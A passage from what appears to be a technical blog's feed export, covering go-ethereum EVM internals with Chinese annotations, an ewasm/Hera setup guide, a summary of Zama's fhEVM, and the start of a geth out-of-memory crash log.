input</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Reclaim the stack as an int pool when the execution stops</span></span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; in.intPool.put(stack.data...) &#125;()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 开始循环PC计数执行 直到有中止执行或者跳出循环</span></span><br><span class="line">	<span class="keyword">for</span> atomic.LoadInt32(&amp;in.evm.abort) == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="comment">// 根据PC计数器获取操作码</span></span><br><span class="line">		op = contract.GetOp(pc)</span><br><span class="line">		<span class="comment">// 根据操作码获取对应的操作函数</span></span><br><span class="line">		operation := in.cfg.JumpTable[op]</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 验证栈中的数据是否符合操作码需要的数据</span></span><br><span class="line">		<span class="keyword">if</span> err := operation.validateStack(stack); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// If the operation is valid, enforce and write restrictions</span></span><br><span class="line">		<span class="keyword">if</span> err := in.enforceRestrictions(op, operation, stack); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> memorySize <span class="keyword">uint64</span></span><br><span class="line">		<span class="comment">// 有些指令是需要额外的内存消耗 在jump_table.go文件中可以看到他们具体每个操作码的对应的额外内存消耗计算</span></span><br><span class="line">		<span class="comment">// 并不是所有的指令都需要计算消耗的内存 </span></span><br><span class="line">		<span class="comment">// memorySize指向对应的计算消耗内存的函数 根据消耗的内存来计算消费的gas</span></span><br><span class="line">		<span class="keyword">if</span> operation.memorySize != <span class="literal">nil</span> &#123;</span><br><span class="line">			memSize, overflow := bigUint64(operation.memorySize(stack))</span><br><span class="line">			<span class="keyword">if</span> overflow &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span>, errGasUintOverflow</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> memorySize, overflow = math.SafeMul(toWordSize(memSize), <span class="number">32</span>); overflow &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span>, errGasUintOverflow</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 计算此操作花费的gas数量</span></span><br><span class="line">		cost, err = operation.gasCost(in.gasTable, in.evm, contract, stack, mem, memorySize)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> || !contract.UseGas(cost) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, ErrOutOfGas</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> memorySize &gt; <span class="number">0</span> &#123;</span><br><span class="line">			mem.Resize(memorySize)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 开始执行此操作码对应的操作函数 同时会返回执行结果同时也会更新PC计数器 </span></span><br><span class="line">		<span class="comment">// 大部分的操作码对应的操作函数都是在instructions.go中可以找得到</span></span><br><span class="line">		res, err := operation.execute(&amp;pc, in.evm, contract, mem, stack)</span><br><span class="line">    <span class="comment">// 如果这个操作码是一个返回参数 那么就把需要的内容写入returnData</span></span><br><span class="line">    <span class="comment">// 按理说应该是只有return参数才会有范湖</span></span><br><span class="line">		<span class="keyword">if</span> operation.returns &#123;</span><br><span class="line">			in.returnData = res</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 到这里也就意味着一个操作码已经执行完成了 应该根据这次的执行结果来决定下一步的动作</span></span><br><span class="line">    <span class="comment">// 1. 如果执行出错了 直接返回错误</span></span><br><span class="line">    <span class="comment">// 2. 如果只能合约代码中止了(比如断言失败) 那么直接返回执行结果 </span></span><br><span class="line">    <span class="comment">// 3. 如果是暂停指令 则直接返回结果</span></span><br><span class="line">    <span class="comment">// 4. 如果操作符不是一个跳转 则直接PC指向下一个指令 继续循环执行</span></span><br><span class="line">		<span class="keyword">switch</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> err != <span class="literal">nil</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		<span class="keyword">case</span> operation.reverts:</span><br><span class="line">			<span class="keyword">return</span> res, errExecutionReverted</span><br><span class="line">		<span class="keyword">case</span> operation.halts:</span><br><span class="line">			<span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">		<span class="keyword">case</span> !operation.jumps:</span><br><span class="line">			pc++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到了这里整个部署合约流程就完成了, 部署合约时是从evm.Create-&gt;run-&gt;interper.run 然后在执行codeCopy指令后把runtime的内容返回出来。 在evm.Create函数中我们也看到了当run执行完成后会把runtime的合约代码最终设置到合约地址名下。 整个合约部署就算完成了。</p>
<p>分析完合约创建接着就该分析合约调用代码了。 调用智能合约和部署在以太坊交易上看来就是to的地址不在是nil而是一个具体的合约地址了。 同时input的内容不再是整个合约编译后的字节码了而是调用函数和对应的实参组合的内容。 这里就涉及到另一个东西那就是abi的概念。此处我不打算详细说明， abi描述了整个接口的详细信息， 根据abi可以解包和打包input调用的数据。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 忽略一些隐藏了主线的内容</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span> <span class="title">Call</span><span class="params">(caller ContractRef, addr common.Address, input []<span class="keyword">byte</span>, gas <span class="keyword">uint64</span>, value *big.Int)</span> <span class="params">(ret []<span class="keyword">byte</span>, leftOverGas <span class="keyword">uint64</span>, err error)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		to       = AccountRef(addr)</span><br><span class="line">		snapshot = evm.StateDB.Snapshot()</span><br><span class="line">	)</span><br><span class="line">	<span class="comment">// 首先要判断这个合约地址是否存在 如果不存在是否是内置的合约 </span></span><br><span class="line">	<span class="keyword">if</span> !evm.StateDB.Exist(addr) &#123;</span><br><span class="line">		precompiles := PrecompiledContractsHomestead</span><br><span class="line">		<span class="keyword">if</span> evm.ChainConfig().IsByzantium(evm.BlockNumber) &#123;</span><br><span class="line">			precompiles = PrecompiledContractsByzantium</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> precompiles[addr] == <span class="literal">nil</span> &amp;&amp; evm.ChainConfig().IsEIP158(evm.BlockNumber) &amp;&amp; value.Sign() == <span class="number">0</span> &#123;</span><br><span class="line">			<span class="comment">// Calling a non existing account, don&#x27;t do antything, but ping the tracer</span></span><br><span class="line">			<span class="keyword">if</span> evm.vmConfig.Debug &amp;&amp; evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">				evm.vmConfig.Tracer.CaptureStart(caller.Address(), addr, <span class="literal">false</span>, input, gas, value)</span><br><span class="line">				evm.vmConfig.Tracer.CaptureEnd(ret, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">nil</span>)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, gas, <span class="literal">nil</span></span><br><span class="line">		&#125;</span><br><span class="line">		evm.StateDB.CreateAccount(addr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 执行进行以太币的转账过程</span></span><br><span class="line">	evm.Transfer(evm.StateDB, caller.Address(), to.Address(), value)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 是不是很熟悉 不管是部署合约还是调用合约都要先创建合约对象 把合约加载出来挂到合约对象下</span></span><br><span class="line">	contract := NewContract(caller, to, value, gas)</span><br><span class="line">	contract.SetCallCode(&amp;addr, evm.StateDB.GetCodeHash(addr), evm.StateDB.GetCode(addr))</span><br><span class="line"></span><br><span class="line">	start := time.Now()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 依然是调用run函数来执行代码 不同之处在于这次的input不在是nil了 而是交易的input内容</span></span><br><span class="line">  <span class="comment">// 在上一节中我们看到CALLDATALOAD这个指令会用到input的内容</span></span><br><span class="line">	ret, err = run(evm, contract, input)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">		<span class="keyword">if</span> err != errExecutionReverted &#123;</span><br><span class="line">			contract.UseGas(contract.Gas)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 最终返回执行结果</span></span><br><span class="line">	<span class="keyword">return</span> ret, contract.Gas, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应该说到了这里只能合约流程就完事了， 可是也许你会好奇命名evm里面有那么多的内容没有分析到。 但是整个流程确实就是这些。 其他的比如栈对象是如何模拟的， 内存是如何模拟的。 操作码对应的操作函数，及其相关gas花费怎么计算的都没有说明。 可是我觉得首先知道整个流程和原理。阅读这些就比较容易了， 因为我们知道目的和原理， 就会明白它的那些代码的作用了。 如果我上去就说那些东西， 整个主线就会被淹没了。</p>
<p>最后还有一个比较重要的接口要说明一下， 它是我们接下来移植中要重点修改的内容。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> StateDB <span class="keyword">interface</span> &#123;</span><br><span class="line">  <span class="comment">// 创建账户函数 表明evm需要你执行创建一个新的账户体系</span></span><br><span class="line">	CreateAccount(common.Address)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 减去一个账户的余额</span></span><br><span class="line">	SubBalance(common.Address, *big.Int)</span><br><span class="line">	<span class="comment">// 添加一个账户的余额</span></span><br><span class="line">	AddBalance(common.Address, *big.Int)</span><br><span class="line">	<span class="comment">// 获取一个账户的余额</span></span><br><span class="line">	GetBalance(common.Address) *big.Int</span><br><span class="line">  <span class="comment">// 获取账户的nonce 因为以太坊要根据nonce在决定交易的执行顺序和合约地址的生成</span></span><br><span class="line">	GetNonce(common.Address) <span class="keyword">uint64</span></span><br><span class="line">	<span class="comment">// 更新合约的nonce</span></span><br><span class="line">	SetNonce(common.Address, <span class="keyword">uint64</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取合约地址的整个合约代码的hash值</span></span><br><span class="line">	GetCodeHash(common.Address) common.Hash</span><br><span class="line">	<span class="comment">// 获取合约代码</span></span><br><span class="line">	GetCode(common.Address) []<span class="keyword">byte</span></span><br><span class="line">	<span class="comment">// 设置合约代码</span></span><br><span class="line">	SetCode(common.Address, []<span class="keyword">byte</span>)</span><br><span class="line">	<span class="comment">// 获取合约代码的大小</span></span><br><span class="line">	GetCodeSize(common.Address) <span class="keyword">int</span></span><br><span class="line">  <span class="comment">// 获取和添加偿还金额</span></span><br><span class="line">	AddRefund(<span class="keyword">uint64</span>)</span><br><span class="line">	GetRefund() <span class="keyword">uint64</span></span><br><span class="line">  <span class="comment">// 注意这两个函数很重要 其实质就是相当于数据库的select和update </span></span><br><span class="line">  <span class="comment">// 一个智能合约的全局静态数据的读取和写入就是通过这两个函数</span></span><br><span class="line">	GetState(common.Address, common.Hash) common.Hash</span><br><span class="line">	SetState(common.Address, common.Hash, common.Hash)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 合约账户自杀 或者是否已经自杀 主要是以太坊的一个机制 自杀的合约会给与退费</span></span><br><span class="line">	Suicide(common.Address) <span class="keyword">bool</span></span><br><span class="line">	HasSuicided(common.Address) <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断一个合约是否存在</span></span><br><span class="line">	Exist(common.Address) <span class="keyword">bool</span></span><br><span class="line">	<span class="comment">// 判断合约是否为空</span></span><br><span class="line">	<span class="comment">// is defined according to EIP161 (balance = nonce = code = 0).</span></span><br><span class="line">	Empty(common.Address) <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">	RevertToSnapshot(<span class="keyword">int</span>)</span><br><span class="line">	Snapshot() <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 此函数就是在我们在智能合约中执行emit命令时调用的</span></span><br><span class="line">	AddLog(*types.Log)</span><br><span class="line">	AddPreimage(common.Hash, []<span class="keyword">byte</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个接口在evm中没有使用到 我们可以写一个空函数</span></span><br><span class="line">	ForEachStorage(common.Address, <span class="function"><span class="keyword">func</span><span class="params">(common.Hash, common.Hash)</span> <span class="title">bool</span>)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到此整个evm分析就结束了, </p>
]]></content>
      <tags>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>ewasm实施说明</title>
    <url>/2019/09/09/ewasm%E5%AE%9E%E6%96%BD%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<h3 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a>概念介绍</h3><p><strong><a href="https://github.com/ewasm/hera">Hera</a></strong> 是 <a href="https://github.com/ewasm/design">ewasm</a>（revision 4）虚拟机的 C++版本，对接了 <a href="https://github.com/ethereum/evmc">EVMC</a> ABIv6。Hera 目的是利用各种 wasm 的后端，为 ethereum 提供服务。Hera 已经在 <a href="https://github.com/ethereum/aleth">aleth</a> 和 <a href="https://github.com/ethereum/go-ethereum">geth</a> 上被测试过了。同时，Hera 支持各种匹配于 EVMC 的客户端。</p>
<p><em><a href="https://github.com/ewasm/design">ewasm</a> 是以太坊系的 <a href="https://zh.wikipedia.org/wiki/WebAssembly">WebAssembly</a> (Ethereum flavored WebAssembly)，目前的版本是 Revision 4。ewasm是使用WebAssembly确定性子集重新设计的以太坊智能合约执行层。</em></p>
<p><em>使用WebAssembly作为智能合约的格式可以获得以下好处：</em></p>
<ul>
<li><em>近乎原生的智能合约的执行速度</em></li>
<li><em>使用许多传统编程语言（如C，C ++和Rust）开发智能合约成为可能</em></li>
<li><em>WebAssembly庞大的开发人员社区和WebAssembly工具链</em></li>
</ul>
<p><strong><a href="https://github.com/ethereum/evmc">EVMC</a></strong> 是以太坊虚拟机（EVMs）和以太坊客户端（如Geth）之间的<strong>低级别ABI</strong>。在EVM侧，它支持经典的EVM1和ewasm。 在客户端（如Geth）侧，它定义了EVM实现访问以太坊环境和状态（state）的接口。</p>
<h3 id="ewasm实施设计1：Hera-geth"><a href="#ewasm实施设计1：Hera-geth" class="headerlink" title="ewasm实施设计1：Hera + geth"></a>ewasm实施设计1：Hera + geth</h3><ol>
<li>创世块配置如下：</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;chainId&quot;</span>: <span class="number">1337</span>,</span><br><span class="line">        <span class="attr">&quot;homesteadBlock&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;byzantiumBlock&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;constantinopleBlock&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip150Block&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip155Block&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip158Block&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;ewasmBlock&quot;</span>: <span class="number">0</span>,	<span class="comment">//**odyssey划重点**</span></span><br><span class="line">        <span class="attr">&quot;ethash&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;nonce&quot;</span>: <span class="string">&quot;0xdeadbeefdeadbeef&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;0x00&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;parentHash&quot;</span>: <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;mixhash&quot;</span>: <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;difficulty&quot;</span>: <span class="string">&quot;0x40&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;gasLimit&quot;</span>: <span class="string">&quot;0xfffffffffffffff&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;alloc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;0x7eff122b94897ea5b0e2a9abf47b86337fafebdc&quot;</span>: &#123; <span class="attr">&quot;balance&quot;</span>: <span class="string">&quot;10000000000000000000000000000000000&quot;</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Build geth with EVMC，编译带有 EVMC 的 geth</li>
</ol>
<p>从目前最新的版本 <a href="https://github.com/ewasm/go-ethereum/releases/tag/v1.9.2-evmc.6.3.0-0">geth 1.9.2 with EVMC 6 support</a> 下载代码。其内已经有 Linux-amd64 的可执行文件，版本基于 geth1.9.2，在 ubuntu 等 linux 系统中可以直接运行。</p>
<p>也可以进入到代码中自行 build：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">cd</span> go-ethereum</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> make geth</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>将 Hera 编译成为一个共享库文件</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/ewasm/hera -b v0.2.4</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">cd</span> hera</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> mkdir build &amp;&amp; <span class="built_in">cd</span> build</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> cmake .. -DBUILD_SHARED_LIBS=ON     //该步骤前可能会需要执行 git submodule update --init</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> cmake --build .</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>使用步骤 1 中的创世块配置文档 geth-config.json</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> ./build/bin/geth --datadir /tmp/ewasm-node/4201/ init geth-config.json</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>运行 geth 与 Hera</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> ./build/bin/geth \</span></span><br><span class="line">--vm.ewasm=&quot;/path/to/libhera.so,metering=true,evm1mode=fallback&quot; \</span><br><span class="line">--datadir /tmp/ewasm-node/4201/ \</span><br><span class="line">--rpc --rpcapi &quot;web3,net,eth,debug&quot; \</span><br><span class="line">--rpcvhosts=&quot;*&quot; --rpcaddr &quot;0.0.0.0&quot; \</span><br><span class="line">--rpccorsdomain &quot;*&quot; \</span><br><span class="line">--vmodule &quot;miner=12,rpc=12&quot; \			//在 odyssey 中不必使用</span><br><span class="line">--mine --miner.threads 1 \				//在 odyssey 中不必使用</span><br><span class="line">--nodiscover \</span><br><span class="line">--networkid 1337 </span><br></pre></td></tr></table></figure>



<p>另外 <a href="https://github.com/go-interpreter/wagon">Wagon</a> 作为WebAssembly-based Go interpreter也是可用的。但是<a href="https://github.com/gballet/go-ethereum%E9%A1%B9%E7%9B%AE%E5%B9%B4%E4%B9%85%E5%A4%B1%E4%BF%AE%E3%80%82%E5%8D%B3%E4%BD%BF%E6%98%AF%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%96%B9%E5%BC%8F%E4%B9%9F%E4%B8%8D%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E7%9A%84%E3%80%82">https://github.com/gballet/go-ethereum项目年久失修。即使是下面的方式也不建议使用的。</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> go get github.com/ethereum/go-ethereum</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$GOROOT</span>/src/github.com/ethereum/go-ethereum</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> git remote add gballet git@github.com:gballet/go-ethereum.git</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> git fetch gballet add-ewasm</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> git checkout add-ewasm</span></span><br></pre></td></tr></table></figure>

<p>架构图如下，请参考：</p>
<p><img src="/2019/09/09/ewasm%E5%AE%9E%E6%96%BD%E8%AF%B4%E6%98%8E/1.jpg"></p>
<p>参考链接==&gt; </p>
<ul>
<li><p>Ewasm public testnet : <a href="https://github.com/ewasm/testnet">https://github.com/ewasm/testnet</a> </p>
</li>
<li><p>WebAssembly 介绍 : <a href="https://willzhuang.github.io/2018/07/26/WebAssembly-%E4%BB%8B%E7%BB%8D/">https://willzhuang.github.io/2018/07/26/WebAssembly-%E4%BB%8B%E7%BB%8D/</a> </p>
</li>
</ul>
]]></content>
      <tags>
        <tag>wasm</tag>
      </tags>
  </entry>
  <entry>
    <title>fhEVM-confidential-smart-contracts-on-the-EVM-using-FHE</title>
    <url>/2024/10/31/fhEVM-confidential-smart-contracts-on-the-EVM-using-FHE/</url>
    <content><![CDATA[<h2 id="https-github-com-zama-ai-fhevm"><a href="#https-github-com-zama-ai-fhevm" class="headerlink" title="https://github.com/zama-ai/fhevm"></a><a href="https://github.com/zama-ai/fhevm">https://github.com/zama-ai/fhevm</a></h2><p><strong>fhEVM</strong> is a technology that enables confidential smart contracts on the EVM using fully homomorphic encryption (FHE).</p>
<ul>
<li><strong>Solidity integration:</strong> fhEVM contracts are simple solidity contracts that are built using traditional solidity toolchains.</li>
<li><strong>Simple developer experience:</strong> Developers can use the <code>euint</code> data types to mark which part of their contracts should be private.</li>
<li><strong>Programmable privacy:</strong> All the logic for access control of encrypted states is defined by developers in their smart contracts.</li>
<li><strong>High precision encrypted integers :</strong> Up to 256 bits of precision for integers</li>
<li><strong>Full range of operators :</strong> All typical operators are available: <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>&lt;</code>, <code>&gt;</code>, <code>==</code>, …</li>
<li><strong>Encrypted if-else conditionals :</strong> Check conditions on encrypted states</li>
<li><strong>On-chain PRNG :</strong> Generate secure randomness without using oracles</li>
<li><strong>Configurable decryption :</strong> Threshold, centralized or KMS decryption</li>
<li><strong>Unbounded compute Depth :</strong> Unlimited consecutive FHE operations<br>Even Circle build a confidential ERC20 on fhEVM - <a href="https://github.com/Inco-fhevm/confidential-erc20-framework">https://github.com/Inco-fhevm/confidential-erc20-framework</a> .<br>Let’s deep dive in it:<h2 id="Decrypt-and-reencrypt"><a href="#Decrypt-and-reencrypt" class="headerlink" title="Decrypt and reencrypt"></a>Decrypt and reencrypt</h2>On fhevm blockchain - ZAMA team built, private key is owned by a Key Management Service (KMS). If the plaintext value is needed at some point, there are two ways to obtain it. Both methods are handled by a service called the Gateway.<br>fhevm allow explicit decryption requests for any encrypted type. The values are decrypted with the network private key.<br><img src="/2024/10/31/fhEVM-confidential-smart-contracts-on-the-EVM-using-FHE/1.png"><br>the detail implementation ==&gt; <a href="https://docs.zama.ai/fhevm/guides/decrypt">https://docs.zama.ai/fhevm/guides/decrypt</a></li>
</ul>
<p>Reencryption is performed on the client side by calling the gateway service using the <a href="https://github.com/zama-ai/fhevmjs/">fhevmjs</a> library.</p>
<p>Zama has another project of FHE on AI — <a href="https://github.com/zama-ai/concrete-ml">https://github.com/zama-ai/concrete-ml</a></p>
<h2 id="confidential-erc20"><a href="#confidential-erc20" class="headerlink" title="confidential-erc20"></a>confidential-erc20</h2><p><a href="https://www.inco.org/" title="https://www.inco.org/">https://www.inco.org/</a> and <a href="https://www.circle.com/en/circle-research">Circle</a> publish a framework <a href="https://github.com/Inco-fhevm/confidential-erc20-framework">https://github.com/Inco-fhevm/confidential-erc20-framework</a> which is leveraging on <strong>fhEVM</strong>:</p>
<ul>
<li>conceals balances.</li>
<li>transaction amounts.</li>
<li>optional viewing and transfer rules to meet regulatory obligations or enhance programmatic risk management.</li>
<li>the counter parties addresses are published on public blockchain.</li>
<li>the private key is also configured as kms-service.</li>
</ul>
]]></content>
      <tags>
        <tag>零知识证明</tag>
        <tag>密码学</tag>
        <tag>加密</tag>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>geth 1.8.15 fatal error runtime out of memory</title>
    <url>/2018/11/23/geth-1-8-15-fatal-error-runtime-out-of-memory/</url>
    <content><![CDATA[<p>Get a <strong>fatal error: runtime: out of memory</strong> in geth. Env is as below:</p>
<ul>
<li>geth version: 1.8.15-stable</li>
<li>go version: 1.11 linux/amd64</li>
<li>Linux version 4.14.47-64.38.amzn2.x86_64 </li>
<li>(mockbuild@ip-10-0-1-219)</li>
<li>(gcc version 7.3.1 20180303 (Red Hat 7.3.1-5) (GCC))</li>
<li>aws型号 c5.large | vCPU：2 | 内存 (GiB)：4</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO [11-22|01:36:30.725] Submitted transaction                    fullhash&#x3D;0x583c48c36a165daed190212facf12813b2a5331b05e43ede7a1e8426936d83d6 recipient&#x3D;0xe2E55079E31cf95589B5433cF06beb448624d0A7</span><br><span class="line">INFO [11-22|01:36:31.286] Committing block                         stateHash&#x3D;cc2f6d…6fbe5b blockHash&#x3D;3b92a3…2a3b13</span><br><span class="line">INFO [11-22|01:36:31.287] Imported new chain segment               blocks&#x3D;1 txs&#x3D;1 mgas&#x3D;0.021 elapsed&#x3D;428.986µs mgasps&#x3D;48.953 number&#x3D;3 hash&#x3D;607b71…154d5e cache&#x3D;964.00B</span><br><span class="line">INFO [11-22|01:36:31.287] Commiting                                module&#x3D;oval        blockHash&#x3D;3b92a30f0a4b332a95b5bf304d133b5ebe76210f6c329b14148069a77c2a3b13 cbr&#x3D;cc2f6d729a06198723f407523b4ac61796a0198aa9e9e3d5a1c17e37e56fbe5b</span><br><span class="line">INFO [11-22|01:42:00.336] Committing block                         stateHash&#x3D;de1af6…3b83f8 blockHash&#x3D;71c97f…2c1bdc</span><br><span class="line">INFO [11-22|01:42:00.337] Imported new chain segment               blocks&#x3D;1 txs&#x3D;1 mgas&#x3D;0.075 elapsed&#x3D;456.862µs mgasps&#x3D;163.472 number&#x3D;4 hash&#x3D;295456…55f08d cache&#x3D;1.27kB</span><br><span class="line">INFO [11-22|01:42:00.337] Commiting                                module&#x3D;oval        blockHash&#x3D;71c97f9a55e28a03d9c114a9749d6a8f50dccbc2a3538f4ce6818fb2c52c1bdc cbr&#x3D;de1af60245d823ff58d280ced344046ef4348957b83900d55cfd8e108d3b83f8</span><br><span class="line">fatal error: runtime: out of memory</span><br><span class="line"></span><br><span class="line">runtime stack:</span><br><span class="line">runtime.throw(0x10bd3c9, 0x16)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;panic.go:608 +0x72</span><br><span class="line">runtime.sysMap(0xc0cc000000, 0x10000000, 0x217fdf8)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;mem_linux.go:156 +0xc7</span><br><span class="line">runtime.(*mheap).sysAlloc(0x2165e60, 0x10000000, 0x313d68, 0x7fcb9139acd8)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;malloc.go:619 +0x1c7</span><br><span class="line">runtime.(*mheap).grow(0x2165e60, 0x8000, 0x0)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;mheap.go:920 +0x42</span><br><span class="line">runtime.(*mheap).allocSpanLocked(0x2165e60, 0x8000, 0x217fe08, 0x448fab)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;mheap.go:848 +0x337</span><br><span class="line">runtime.(*mheap).alloc_m(0x2165e60, 0x8000, 0x7fcb9cf00101, 0x7fcb9cf025a0)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;mheap.go:692 +0x119</span><br><span class="line">runtime.(*mheap).alloc.func1()</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;mheap.go:759 +0x4c</span><br><span class="line">runtime.(*mheap).alloc(0x2165e60, 0x8000, 0x7fcb91010101, 0x42baf5)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;mheap.go:758 +0x8a</span><br><span class="line">runtime.largeAlloc(0x10000000, 0x460101, 0x7fcb9d0896c0)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;malloc.go:1019 +0x97</span><br><span class="line">runtime.mallocgc.func1()</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;malloc.go:914 +0x46</span><br><span class="line">runtime.systemstack(0xc000308480)</span><br><span class="line">	&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;asm_amd64.s:351 +0x66</span><br><span class="line">runtime.mstart()</span><br><span class="line">	